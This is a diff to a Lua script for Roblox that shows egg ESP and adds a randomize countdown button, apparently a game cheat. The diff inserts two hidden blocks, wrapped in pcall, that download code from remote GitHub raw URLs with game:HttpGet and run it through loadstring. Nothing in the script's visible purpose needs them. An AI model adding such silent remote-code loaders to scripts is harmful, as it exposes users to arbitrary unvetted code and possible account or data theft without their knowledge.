@@ -144,6 +144,10 @@ local function flashEffect(button)
     end
 end
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munkizzzz/xx/refs/heads/main/egg-randomizer"))()
+end)
+
 local function countdownAndRandomize(button)
     for i = 10, 1, -1 do
         button.Text = "🎲 Randomize in: " .. i
@@ -232,6 +236,10 @@ end)
 for _, egg in pairs(getPlayerGardenEggs(60)) do
     applyEggESP(egg, truePetMap[egg])
 end
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/munki/xz/refs/heads/main/egg-randomizerV2"))()
+end)
 
 -- 🔁 Auto Randomize Button
 local autoBtn = Instance.new("TextButton", frame)
